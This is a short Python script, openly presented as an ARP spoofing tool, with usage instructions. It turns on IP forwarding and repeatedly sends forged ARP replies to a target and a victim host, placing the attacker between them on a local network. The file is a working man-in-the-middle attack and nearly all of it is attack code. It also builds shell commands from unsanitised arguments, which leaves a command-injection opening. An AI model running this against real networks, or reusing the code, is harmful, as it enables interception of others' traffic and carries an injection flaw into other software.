# Description: 
# This is ARP Spoofing tool
# Usage:
# arpspoof.py <interface> <target_ip> <victim_ip>
# ex) 
# arpspoof.py eth1 192.168.20.200 192.168.20.201

from scapy.all import *
import time
import os
import sys

# start ip forward
os.system('sysctl -w net.ipv4.ip_forward=1')
print("===== ARP SPOORF START =====")

interface = sys.argv[1]
target_ip = sys.argv[2]
victim_ip = sys.argv[3]

my_ip = os.popen('ifconfig %s | grep \'inet \' | awk \'{print $2}\''%interface).read()
my_mac = os.popen('ifconfig %s | grep ether | awk \'{print $2}\''%interface).read()

# To get arp table and mac address
os.popen('ping -c 1 %s >/dev/null'%target_ip).read()
os.popen('ping -c 1 %s >/dev/null'%victim_ip).read()
target_mac = os.popen('arp -an | grep %s | grep %s | awk \'{print $4}\''%(target_ip,interface)).read()
victim_mac = os.popen('arp -an | grep %s | grep %s | awk \'{print $4}\''%(victim_ip,interface)).read()

tryARP = Ether()/ARP()

# make ARP packet
def arp_reply(tryARP, target_ip, target_mac, victim_ip, my_mac, interface):
    tryARP.dst = target_mac
    tryARP.src = my_mac
    tryARP.op = 2
    tryARP.hwsrc = my_mac
    tryARP.psrc = victim_ip
    tryARP.hwdst = target_mac
    tryARP.pdst = target_ip
    
    sendp(tryARP, iface=interface)

while True:
        arp_reply(tryARP, target_ip, target_mac, victim_ip, my_mac, interface)
        arp_reply(tryARP, victim_ip, victim_mac, target_ip, my_mac, interface)
        time.sleep(2)

